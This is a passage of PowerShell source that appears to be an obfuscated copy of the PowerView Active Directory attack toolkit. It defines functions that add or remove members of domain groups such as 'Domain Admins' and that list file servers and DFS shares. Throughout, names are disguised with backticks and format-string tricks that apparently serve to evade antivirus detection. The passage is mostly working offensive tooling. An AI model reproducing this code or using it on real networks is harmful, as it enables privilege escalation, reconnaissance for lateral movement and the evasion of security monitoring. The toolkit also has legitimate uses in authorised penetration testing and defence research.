        [Management.Automation.CredentialAttribute()]
        ${CRe`DEn`TiAl} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${CO`NteXT`ARg`UMEnTS} = @{
            'Identity' = ${iD`EN`Tity}
        }
        if (${psBOUnd`PAr`AMEt`ErS}['Domain']) { ${CoNtExtA`RG`UM`eNTs}['Domain'] = ${D`o`Main} }
        if (${PsBOU`NDp`A`R`AMET`eRs}['Credential']) { ${cOnt`ExTa`R`g`UMENTs}['Credential'] = ${Cr`E`dENti`AL} }

        ${groUP`cO`N`TExt} = &("{5}{3}{1}{4}{0}{2}"-f 'nt','palC','ext','-Princi','o','Get') @ContextArguments

        if (${GRo`UPCOn`TE`XT}) {
            try {
                ${Gr`Oup} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${Gr`OuPc`o`NTeXT}.Context, ${gRouP`c`ontExt}.Identity)
            }
            catch {
                &("{0}{4}{1}{3}{2}" -f'W','ar','g','nin','rite-W') "[Add-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }

    PROCESS {
        if (${gro`UP}) {
            ForEach (${M`EMbER} in ${me`MBERs}) {
                if (${me`m`Ber} -match '.+\\.+') {
                    ${cOntE`xtARgU`me`Nts}['Identity'] = ${me`mb`ER}
                    ${UsERco`Nt`eXt} = &("{1}{2}{0}{3}"-f 'ncipal','G','et-Pri','Context') @ContextArguments
                    if (${uS`ER`Co`NtexT}) {
                        ${u`sER`I`DEnTity} = ${uSErco`N`TeXT}.Identity
                    }
                }
                else {
                    ${usErC`o`NTeXT} = ${Gr`O`UPCoN`TE`xt}
                    ${uSer`IDen`Ti`Ty} = ${m`EMBER}
                }
                &("{2}{1}{0}" -f'se','erbo','Write-V') "[Add-DomainGroupMember] Adding member '$Member' to group '$Identity'"
                ${M`EmB`ER} = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(${us`E`RCO`Ntext}.Context, ${uSerI`d`E`NtitY})
                ${g`Ro`Up}.Members.Add(${M`embER})
                ${gr`O`Up}.Save()
            }
        }
    }
}


function r`eMOv`e-dOMainGrOUpME`Mb`er {
<#
.SYNOPSIS

Removes a domain user (or group) from an existing domain group, assuming
appropriate permissions to do so.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-PrincipalContext  

.DESCRIPTION

First binds to the specified domain context using Get-PrincipalContext.
The bound domain context is then used to search for the specified -GroupIdentity,
which returns a DirectoryServices.AccountManagement.GroupPrincipal object. For
each entry in -Members, each member identity is similarly searched for and removed
from the group.

.PARAMETER Identity

A group SamAccountName (e.g. Group1), DistinguishedName (e.g. CN=group1,CN=Users,DC=testlab,DC=local),
SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114), or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202)
specifying the group to remove members from.

.PARAMETER Members

One or more member identities, i.e. SamAccountName (e.g. Group1), DistinguishedName
(e.g. CN=group1,CN=Users,DC=testlab,DC=local), SID (e.g. S-1-5-21-890171859-3433809279-3366196753-1114),
or GUID (e.g. 4c435dd7-dc58-4b14-9a5e-1fdb0e80d202).

.PARAMETER Domain

Specifies the domain to use to search for user/group principals, defaults to the current domain.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Remove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y'

Removes harmj0y from 'Domain Admins' in the current domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Remove-DomainGroupMember -Identity 'Domain Admins' -Members 'harmj0y' -Credential $Cred

Removes harmj0y from 'Domain Admins' in the current domain using the alternate credentials.

.LINK

http://richardspowershellblog.wordpress.com/2008/05/25/system-directoryservices-accountmanagement/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = ${T`RUe})]
        [Alias('GroupName', 'GroupIdentity')]
        [String]
        ${i`dentitY},

        [Parameter(Mandatory = ${tr`UE}, ValueFromPipeline = ${TR`Ue}, ValueFromPipelineByPropertyName = ${t`RUe})]
        [Alias('MemberIdentity', 'Member', 'DistinguishedName')]
        [String[]]
        ${m`EMBERS},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Dom`A`In},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${C`Red`e`NtiaL} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        ${c`ONTexT`AR`GuMEn`Ts} = @{
            'Identity' = ${iDE`N`TIty}
        }
        if (${Ps`BOu`ND`pARAMEtERS}['Domain']) { ${c`o`NTE`X`TArGumeNTS}['Domain'] = ${d`oMaIN} }
        if (${p`sBoUnDPa`R`Ameters}['Credential']) { ${cOn`TeXTaRGUm`en`TS}['Credential'] = ${cR`e`dENT`ial} }

        ${G`RO`UpC`ONT`EXt} = &("{1}{2}{0}{4}{3}" -f'-Princip','Ge','t','xt','alConte') @ContextArguments

        if (${gRou`p`CO`NTexT}) {
            try {
                ${G`RoUp} = [System.DirectoryServices.AccountManagement.GroupPrincipal]::FindByIdentity(${gro`UPCoNte`XT}.Context, ${G`R`OuPcONTE`Xt}.Identity)
            }
            catch {
                &("{2}{0}{1}"-f'rite-War','ning','W') "[Remove-DomainGroupMember] Error finding the group identity '$Identity' : $_"
            }
        }
    }

    PROCESS {
        if (${G`ROUP}) {
            ForEach (${mE`m`Ber} in ${me`m`BERs}) {
                if (${MEmb`ER} -match '.+\\.+') {
                    ${C`OnteXT`A`RGuME`NTS}['Identity'] = ${M`E`MbEr}
                    ${uS`eR`cONTexT} = &("{4}{5}{2}{3}{0}{1}" -f'alC','ontext','t-','Princip','G','e') @ContextArguments
                    if (${U`S`ercO`NTExt}) {
                        ${U`seRIDe`NtITY} = ${user`coNt`EXt}.Identity
                    }
                }
                else {
                    ${uSerC`On`TeXt} = ${GRoUPC`ON`Te`xt}
                    ${us`ERiDe`NtitY} = ${M`eM`Ber}
                }
                &("{1}{0}{2}"-f't','Wri','e-Verbose') "[Remove-DomainGroupMember] Removing member '$Member' from group '$Identity'"
                ${m`eM`BeR} = [System.DirectoryServices.AccountManagement.Principal]::FindByIdentity(${u`seRco`NTeXt}.Context, ${usErid`En`TITY})
                ${gRO`UP}.Members.Remove(${MeM`B`ER})
                ${g`RO`Up}.Save()
            }
        }
    }
}


function Get`-doM`AInf`ileServEr {
<#
.SYNOPSIS

Returns a list of servers likely functioning as file servers.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher  

.DESCRIPTION

Returns a list of likely fileservers by searching for all users in Active Directory
with non-null homedirectory, scriptpath, or profilepath fields, and extracting/uniquifying
the server names.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainFileServer

Returns active file servers for the current domain.

.EXAMPLE

Get-DomainFileServer -Domain testing.local

Returns active file servers for the 'testing.local' domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainFileServer -Credential $Cred

.OUTPUTS

String

One or more strings representing file server names.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = ${T`RUE}, ValueFromPipelineByPropertyName = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        ${dOm`A`IN},

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        ${Lda`PFIl`TEr},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${sEaRcH`BA`SE},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${seRv`ER},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${se`A`RcHSco`pe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${rE`s`U`ltpagESi`ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Ser`VerTIm`ELIm`it},

        [Switch]
        ${TO`M`BsToNE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${CREDeNt`I`Al} = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        function sP`Li`T-pa`TH {
            # short internal helper to split UNC server paths
            Param([String]${p`AtH})

            if (${p`AtH} -and (${p`Ath}.split('\\').Count -ge 3)) {
                ${T`eMp} = ${p`AtH}.split('\\')[2]
                if (${te`Mp} -and (${te`MP} -ne '')) {
                    ${t`emP}
                }
            }
        }

        ${s`EaRc`HERar`GUmENTs} = @{
            'LDAPFilter' = '(&(samAccountType=805306368)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(|(homedirectory=*)(scriptpath=*)(profilepath=*)))'
            'Properties' = 'homedirectory,scriptpath,profilepath'
        }
        if (${PSboUND`paRam`E`TeRS}['SearchBase']) { ${se`A`RChER`AR`gU`MentS}['SearchBase'] = ${SeAr`ch`BASe} }
        if (${p`SB`o`UNdparAmeTERS}['Server']) { ${SeA`RcHerar`gum`ENTS}['Server'] = ${s`ERv`ER} }
        if (${psbO`UNdP`A`Ram`eTe`RS}['SearchScope']) { ${s`EaR`cHe`RarguMEnTs}['SearchScope'] = ${Se`A`RC`hsCopE} }
        if (${Ps`B`Ou`N`DPaRAMeteRS}['ResultPageSize']) { ${S`Ear`C`hera`RGuMents}['ResultPageSize'] = ${r`ES`ULtpAg`Es`IZE} }
        if (${P`sBounDp`A`RAme`TerS}['ServerTimeLimit']) { ${sear`c`He`RaRgum`ENtS}['ServerTimeLimit'] = ${seRVeRt`iM`E`l`IMiT} }
        if (${PsBOUNd`paRa`ME`TErs}['Tombstone']) { ${sEA`R`chErAr`gUMENtS}['Tombstone'] = ${To`mb`stone} }
        if (${pSboUNdPA`RamE`Te`Rs}['Credential']) { ${s`EaRchErAr`GUmEn`TS}['Credential'] = ${Cred`e`N`TIAL} }
    }

    PROCESS {
        if (${pSBOundPA`RA`M`et`erS}['Domain']) {
            ForEach (${t`ARgE`TD`OMAiN} in ${dOm`A`in}) {
                ${s`ea`R`cheRA`Rgu`MeNtS}['Domain'] = ${tA`RGeT`D`OmaIn}
                ${U`sER`SE`ARCher} = &("{3}{4}{5}{2}{0}{1}"-f'rc','her','omainSea','Ge','t','-D') @SearcherArguments
                # get all results w/o the pipeline and uniquify them (I know it's not pretty)
                $(ForEach(${US`ERrES`U`lT} in ${usEr`seA`R`cHeR}.FindAll()) {if (${userRe`S`ULt}.Properties['homedirectory']) {&("{0}{1}{2}" -f'Spl','i','t-Path')(${User`R`E`sult}.Properties['homedirectory'])}if (${USER`R`ES`Ult}.Properties['scriptpath']) {&("{2}{1}{0}"-f 'Path','lit-','Sp')(${US`er`Res`Ult}.Properties['scriptpath'])}if (${U`SerResU`lT}.Properties['profilepath']) {&("{1}{2}{3}{0}"-f 'h','Spl','i','t-Pat')(${U`Se`RrEsULt}.Properties['profilepath'])}}) | &("{1}{0}{2}" -f'rt','So','-Object') -Unique
            }
        }
        else {
            ${uS`ERSear`c`h`ER} = &("{1}{0}{2}{3}" -f 'Doma','Get-','inSearc','her') @SearcherArguments
            $(ForEach(${US`Erre`sUlT} in ${us`E`RSe`ArChER}.FindAll()) {if (${u`seRR`eS`ULt}.Properties['homedirectory']) {&("{1}{2}{0}" -f'h','S','plit-Pat')(${u`SErRe`suLT}.Properties['homedirectory'])}if (${uS`ERR`eS`UlT}.Properties['scriptpath']) {&("{0}{1}{2}{3}" -f'S','p','lit-P','ath')(${UsErRe`S`ULT}.Properties['scriptpath'])}if (${USe`Rres`U`lT}.Properties['profilepath']) {&("{1}{0}{2}" -f'lit','Sp','-Path')(${USe`Rr`ES`ULt}.Properties['profilepath'])}}) | &("{1}{2}{0}"-f'rt-Object','S','o') -Unique
        }
    }
}


function gEt-D`omaI`NdFS`shaRE {
<#
.SYNOPSIS

Returns a list of all fault-tolerant distributed file systems
for the current (or specified) domains.

Author: Ben Campbell (@meatballs__)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainSearcher  

.DESCRIPTION

This function searches for all distributed file systems (either version
1, 2, or both depending on -Version X) by searching for domain objects
matching (objectClass=fTDfs) or (objectClass=msDFS-Linkv2), respectively
The server data is parsed appropriately and returned.

.PARAMETER Domain

Specifies the domains to use for the query, defaults to the current domain.

.PARAMETER SearchBase

The LDAP source to search through, e.g. "LDAP://OU=secret,DC=testlab,DC=local"
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainDFSShare

Returns all distributed file system shares for the current domain.

.EXAMPLE

Get-DomainDFSShare -Domain testlab.local

Returns all distributed file system shares for the 'testlab.local' domain.

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-DomainDFSShare -Credential $Cred

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject describing the distributed file systems.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseApprovedVerbs', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter( ValueFromPipeline = ${t`RUe}, ValueFromPipelineByPropertyName = ${tR`UE})]
        [ValidateNotNullOrEmpty()]
        [Alias('DomainName', 'Name')]
        [String[]]
        ${Do`mAIn},

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        ${S`EAR`CHBase},

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        ${Ser`VEr},

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        ${S`eA`RchSCOpe} = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        ${r`EsU`lTpAGeSi`Ze} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${Serve`R`Ti`ME`limIT},

        [Switch]
        ${toMB`sT`ONe},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${c`REdEnT`IAl} = [Management.Automation.PSCredential]::Empty,

        [ValidateSet('All', 'V1', '1', 'V2', '2')]
        [String]
        ${v`ersi`ON} = 'All'
    )

    BEGIN {
        ${se`ARch`e`RARgUmE`N`TS} = @{}
        if (${p`sB`OUnDP`ARAmETERs}['SearchBase']) { ${SE`ARCheRAR`Gu`MEn`TS}['SearchBase'] = ${sEA`R`CHBAsE} }
        if (${PsBoUNd`pa`RaMe`TeRs}['Server']) { ${se`A`RCher`ARGuMe`NTs}['Server'] = ${SeRv`Er} }
        if (${P`sBound`PArAm`ETERS}['SearchScope']) { ${seaR`Ch`EraRG`Um`ents}['SearchScope'] = ${sE`Archs`Co`pe} }
        if (${PS`B`oUnd`pA`RAmeTERS}['ResultPageSize']) { ${SEaRChERaRG`U`mE`NTs}['ResultPageSize'] = ${ReS`UlT`pa`GESIZE} }
        if (${PSBOuN`Dp`A`R`AME`TERs}['ServerTimeLimit']) { ${SeArc`hE`Ra`RgU`M`eNTS}['ServerTimeLimit'] = ${S`erverTiMElIM`iT} }
        if (${ps`Bo`U`Ndp`ARamETerS}['Tombstone']) { ${S`Ea`R`Che`RarguMENtS}['Tombstone'] = ${to`MBS`TonE} }
        if (${ps`Bo`U`NDpA`RaMEt`ers}['Credential']) { ${Se`A`RcherarGUm`entS}['Credential'] = ${C`RedEnT`iaL} }

        function pA`RsE-`PKt {
            [CmdletBinding()]
            Param(
                [Byte[]]
                ${p`kt}
            )

            ${B`IN} = ${P`KT}
            ${bL`Ob_VeR`siON} = [bitconverter]::ToUInt32(${b`In}[0..3],0)
            ${bLOB`_eLEMEnT`_`CouNt} = [bitconverter]::ToUInt32(${b`in}[4..7],0)
            ${oF`FS`Et} = 8
            #https://msdn.microsoft.com/en-us/library/cc227147.aspx
            ${OB`J`ECT`_LISt} = @()
            for(${I}=1; ${i} -le ${blo`B_ElemeNt`_c`O`UNT}; ${I}++){
                ${Bl`o`B`_nam`E_SIZe`_sTArT} = ${oFFS`ET}
                ${Bl`OB_NAMe_`siz`e_END} = ${oFF`S`Et} + 1
                ${BloB_`NA`M`E_siZE} = [bitconverter]::ToUInt16(${B`IN}[${Bl`ob_NAme`_Si`ZE_`sTARt}..${BLo`B`_naM`e_SIze_e`ND}],0)

                ${BLO`B_`N`AME_sTart} = ${Bl`O`B_nAM`E_siz`e_e`ND} + 1
                ${bLoB_N`A`me_`ENd} = ${bLOb_n`AMe`_s`TArT} + ${bLOb`_namE`_`si`Ze} - 1
                ${BL`Ob`_`Name} = [System.Text.Encoding]::Unicode.GetString(${B`IN}[${bl`ob_naME`_s`TARt}..${BLoB`_NA`me_eND}])

                ${blOB_dA`T`A_SI`Ze_sT`A`Rt} = ${bLo`B`_n`AMe_END} + 1
                ${B`LOB`_data_`SiZE_`END} = ${B`l`oB_daT`A_Siz`e_`STart} + 3
                ${BLOb`_dAta`_s`Ize} = [bitconverter]::ToUInt32(${b`iN}[${bl`oB`_D`AtA`_SIz`E_`STArT}..${BLOb_D`ATA`_siZ`e_E`ND}],0)

                ${BlOB_`daT`A_St`Art} = ${B`Lo`B_DAta_`Si`z`e_eND} + 1
                ${Blob_d`Ata`_e`ND} = ${BL`OB`_da`TA_`StaRt} + ${BlOB_`Dat`A_si`ZE} - 1
                ${BL`O`B_datA} = ${b`In}[${b`LOB_`d`At`A_ST`Art}..${BlOb`_dA`Ta`_`EnD}]
                switch -wildcard (${BLoB_n`A`me}) {
                    "\siteroot" {  }
                    "\domainroot*" {
                        # Parse DFSNamespaceRootOrLinkBlob object. Starts with variable length DFSRootOrLinkIDBlob which we parse first...
                        # DFSRootOrLinkIDBlob
                        ${ro`OT_O`R_LinK_`guID_`start} = 0
                        ${R`ooT_OR_`L`I`Nk`_gUid_`enD} = 15
                        ${ROot_OR`_L`INK_`G`U`Id} = [byte[]]${bLO`B_`dATa}[${rOOT_Or`_lINk_`G`Uid_`sTa`Rt}..${rO`Ot`_or_lINK_GU`i`d`_EnD}]
                        ${GU`Id} = &("{2}{0}{1}" -f'-Ob','ject','New') ("{1}{0}" -f 'd','Gui')(,${RO`oT_`o`R_LINk_GUID}) # should match $guid_str
                        ${PreFix_Si`Z`e_St`ART} = ${ROoT`_oR`_`LInk_`GuID`_e`ND} + 1
                        ${PreFIx`_S`iZ`e_E`Nd} = ${pREfiX_`s`IZ`E`_s`TarT} + 1
                        ${pr`Ef`Ix_`siZe} = [bitconverter]::ToUInt16(${b`LO`B_`DATA}[${PR`Efix_Si`ZE_`s`Tart}..${p`ReFiX_`sIZE`_`END}],0)
                        ${PrefIX_`S`TA`Rt} = ${P`R`Efix_`si`ze_EnD} + 1
                        ${PREFi`x_e`ND} = ${PR`EFIX_S`TArT} + ${pRe`F`Ix`_SizE} - 1
                        ${P`ReF`IX} = [System.Text.Encoding]::Unicode.GetString(${B`loB`_DaTa}[${PRefI`x_ST`ARt}..${PR`EfiX_E`Nd}])

                        ${shORT`_p`Refi`x_SIzE_`STArT} = ${Pre`FIX_E`Nd} + 1
                        ${shOr`T_PRE`FiX_Siz`e`_ENd} = ${shoRT_preF`ix_sIZ`e_`S`TArT} + 1
                        ${S`HORT_prE`Fi`x_S`IZE} = [bitconverter]::ToUInt16(${bl`Ob_`daTA}[${sHORt`_PReFix`_Si`zE`_`ST`ART}..${ShorT_`prEfIX_`si`zE_`E`ND}],0)
                        ${sh`oRT_pr`E`FIx_sTART} = ${S`HOrT_`Pr`E`FI`X_S`iZE_eND} + 1
                        ${sho`Rt_`pre`FIx_end} = ${shor`T`_`PReFI`X_StArT} + ${Shor`T_`PrefIx`_`S`IZE} - 1
                        ${s`H`O`RT_preFiX} = [System.Text.Encoding]::Unicode.GetString(${b`L`O`B_DATA}[${s`HOr`T_PRefix`_`S`Ta`RT}..${s`ho`Rt`_PrEF`IX_`eNd}])

                        ${Ty`P`e_S`TaRt} = ${ShORt`_p`REfI`x_end} + 1
                        ${tY`P`E_END} = ${typE`_`S`TArt} + 3
                        ${Ty`pe} = [bitconverter]::ToUInt32(${B`LOB_D`A`TA}[${TY`pe_s`TART}..${TY`P`E_enD}],0)

                        ${stAtE_S`TA`Rt} = ${T`y`Pe_End} + 1
                        ${s`TaTE`_`End} = ${staTE`_st`Art} + 3
                        ${s`TaTE} = [bitconverter]::ToUInt32(${B`lo`B_da`TA}[${sta`TE_`ST`ART}..${sT`A`Te_end}],0)

                        ${c`OmmENT`_sIz`e_`s`Ta`Rt} = ${stAT`E_`end} + 1
                        ${com`m`enT_s`Ize_END} = ${co`MMEN`T_`SIze`_Sta`RT} + 1
                        ${COmME`N`T_S`iZe} = [bitconverter]::ToUInt16(${Bl`oB_d`Ata}[${comme`N`T_`sI`z`e_StARt}..${COmmEnt_`s`IZe_`end}],0)
                        ${C`OmmeN`T_s`Ta`RT} = ${cOMm`E`Nt`_`SIze_END} + 1
                        ${cOM`mEn`T_end} = ${c`O`mmeNt_STaRT} + ${coM`Me`NT_SI`zE} - 1
                        if (${commEn`T_`sIzE} -gt 0)  {
                            ${COMme`Nt} = [System.Text.Encoding]::Unicode.GetString(${bloB_`D`A`Ta}[${Co`m`MenT_stA`RT}..${COM`mEN`T_E`Nd}])
                        }
                        ${pRe`F`ix_tImEstaMp_`sT`A`Rt} = ${cO`MMEnt`_EnD} + 1
                        ${PrE`FIX_TI`ME`S`T`Am`p_eND} = ${p`REFiX_timEStAM`p`_s`TaRt} + 7
                        # https://msdn.microsoft.com/en-us/library/cc230324.aspx FILETIME
                        ${prEfIX_`T`iMest`AMp} = ${bLo`B_D`Ata}[${Pr`efIx_t`iM`E`StaMp`_sTarT}..${P`RE`Fix_`TiMeStaMp_e`Nd}] #dword lowDateTime #dword highdatetime
                        ${st`AtE_TIMesTa`MP`_STa`RT} = ${pr`e`FIx_Ti`MeStamp`_eND} + 1
                        ${st`AtE_T`IMES`T`AmP_eND} = ${sTAT`e_`Tim`eS`TAMp_s`TARt} + 7
                        ${S`T`AtE_TimeSt`A`mp} = ${B`lo`B_DatA}[${S`TAte_`Tim`es`TaMp_ST`A`Rt}..${St`AtE`_t`I`MEsTAmP_EnD}]
                        ${cOMMEn`T`_TIMe`st`Amp_s`TaRt} = ${staT`e_TIm`es`T`A`Mp_enD} + 1
                        ${coMment_`TIMesT`A`mp`_ENd} = ${co`M`mEN`T_TIMeSt`Amp_S`TA`Rt} + 7
                        ${cOmm`e`Nt_t`iMestamP} = ${b`l`Ob_d`AtA}[${COmMEnt`_`TIm`esTam`p_`ST`ART}..${cOMmEN`T_t`imestAm`p`_`E`ND}]
                        ${VerSIoN`_St`ArT} = ${C`Om`ment_TI`meStAmp_ENd}  + 1
                        ${V`E`RS`IoN_eNd} = ${VErsi`o`N_stARt} + 3
                        ${vEr`s`ioN} = [bitconverter]::ToUInt32(${bLo`B_`daTa}[${Ve`RS`ioN`_`StART}..${verS`ION`_ENd}],0)

                        # Parse rest of DFSNamespaceRootOrLinkBlob here
                        ${dF`S`_T`ARg`E`TLI`St_blob`_SIzE_sta`RT} = ${VeRs`i`On`_eND} + 1
                        ${DFs`_TARgetliST_Bl`oB`_`Siz`e_`eND} = ${Df`s`_tARg`ETlist`_BLOb`_SiZE_START} + 3
                        ${DFs`_TaRgetLi`st`_`B`l`ob_si`ze} = [bitconverter]::ToUInt32(${bLo`B_dA`TA}[${DFs_tA`R`getli`st_`BLob`_SIZe_stARt}..${dfs_TAr`g`E`T`LI`St_Blo`B_siZe_E`ND}],0)

                        ${dfS`_taRge`TliSt_BL`o`B_`staRt} = ${Dfs_`T`ArGe`TLIST_bLOb_s`izE`_End} + 1
                        ${DFS_taR`GetLI`S`T_`BLo`B_e`ND} = ${DfS_tA`RgE`Tl`isT`_blOB_Start} + ${dfS_`Ta`R`geTLIst`_b`L`O`B_SIze} - 1
                        ${D`Fs`_`TargETL`isT_blob} = ${bLoB`_`D`AtA}[${dFs`_t`A`RgEtlIst`_bLob`_staRT}..${DF`S_ta`RGe`T`liSt`_BL`OB`_end}]
                        ${ReSeRVEd_blob_`s`I`ZE`_StA`RT} = ${dfS`_tAr`gETLIs`T_BLoB_`eND} + 1
                        ${rEsE`R`VeD_`Bl`OB_`Si`zE_End} = ${RE`SErVED_b`lo`B_SIZE`_s`TA`Rt} + 3
                        ${Re`se`R`Ved_b`lOb_SiZE} = [bitconverter]::ToUInt32(${BLOb`_`daTA}[${REser`VeD_bLoB`_`SIZe_Sta`Rt}..${rE`ser`VeD_B`lOB`_SI`zE_E`Nd}],0)

                        ${R`Es`eRVed_bLOB_s`TA`RT} = ${r`eser`VE`D_`Blob`_s`IZE_EnD} + 1
                        ${R`EsERved_BL`Ob_`enD} = ${ReS`Er`VeD_blO`B_sTa`RT} + ${ReS`ERve`d_`BlO`B_S`iZe} - 1
                        ${r`ESe`R`Ved_Blob} = ${bLoB`_`DaTa}[${R`eS`eRv`eD_bL`o`B_`sTart}..${r`ESeRv`eD_blOB_`End}]
                        ${r`eF`eRrA`L_t`TL`_ST`ARt} = ${rEs`ERvE`d_bL`ob`_EnD} + 1
                        ${reFerRaL`_`T`TL_`eNd} = ${ReferRAl_t`Tl_`S`TarT} + 3
                        ${r`eFERR`AL_t`TL} = [bitconverter]::ToUInt32(${blOB`_DA`Ta}[${Refe`R`RAL_`TTl_StART}..${ReferR`A`l_tT`l_`eND}],0)

                        #Parse DFSTargetListBlob
                        ${tARge`T`_c`OUNt_s`TARt} = 0
                        ${tARgET_c`O`Unt_e`ND} = ${tARg`e`T_`counT`_`stA`RT} + 3
                        ${tA`RGet`_`coUnt} = [bitconverter]::ToUInt32(${dfs_tARG`ETLIST`_`BLOB}[${TaRgeT`_couN`T_S`TA`Rt}..${tA`RgE`T`_Cou`NT_END}],0)
                        ${T_`O`FfSet} = ${tArge`T_co`Un`T_`e`ND} + 1

                        for(${J}=1; ${j} -le ${t`A`RGET_`c`oUNT}; ${J}++){
                            ${TarGET`_en`TrY_`Si`ZE_StARt} = ${t_`OfF`sEt}
                            ${tAr`Ge`T_EN`TR`Y_S`izE_`eNd} = ${TAr`gE`T_E`N`T`Ry`_siZE_S`TaRT} + 3
                            ${tAr`GeT`_ENtr`y_SiZe} = [bitconverter]::ToUInt32(${D`FS`_`TARgETL`I`ST_blob}[${t`A`R`ge`T_`ENTRy_siZE_stART}..${TAR`Get_E`N`T`RY_sIzE_`end}],0)
                            ${ta`RGe`T`_T`iMe_s`TAmP_`s`TaRT} = ${ta`RG`e`T_eNT`R`Y_sizE`_ENd} + 1
                            ${t`ArgET_T`i`me_StAMp_e`ND} = ${TaRG`e`T_tIME_`S`T`A`Mp_ST`ART} + 7
                            # FILETIME again or special if priority rank and priority class 0
                            ${T`A`RG`ET_Time_`sT`AMP} = ${d`F`S`_targEt`LISt_BL`OB}[${tAr`g`eT_`TImE_StA`Mp_s`TArt}..${t`ARGet`_tIME_`S`TA`mP_eND}]
                            ${ta`RG`e`T`_StaTE_STaRT} = ${Ta`RgET_tIME_`s`TAMp`_`E`Nd} + 1
                            ${t`A`RGeT`_STA`T`E_eNd} = ${T`AR`get_st`AtE_St`A`RT} + 3
                            ${TAr`GEt_sT`AtE} = [bitconverter]::ToUInt32(${dF`S`_`Tar`GETl`ist_Blob}[${T`Arg`eT_St`At`e_sT`ArT}..${t`A`R`get_St`ATe`_EnD}],0)

                            ${TaRGe`T_`T`YpE`_sTa`RT} = ${TARGe`T_S`TaT`E`_eNd} + 1
                            ${TAR`g`eT_TY`PE_`END} = ${tAr`g`eT_tyPe_S`TaRt} + 3
                            ${TA`RG`et_TYPE} = [bitconverter]::ToUInt32(${dFs_ta`R`GE`TLiSt_`BLOb}[${TA`RGET_tyP`E_s`TARt}..${taR`GET_`TY`pe_e`ND}],0)

                            ${serVER_`NaM`e`_S`iZE_`St`Art} = ${TaRg`eT_`TyPE_`eNd} + 1
                            ${sERvE`R_n`AME_S`I`ZE_`eNd} = ${sERvER`_NAm`e`_`Si`zE`_sTArt} + 1
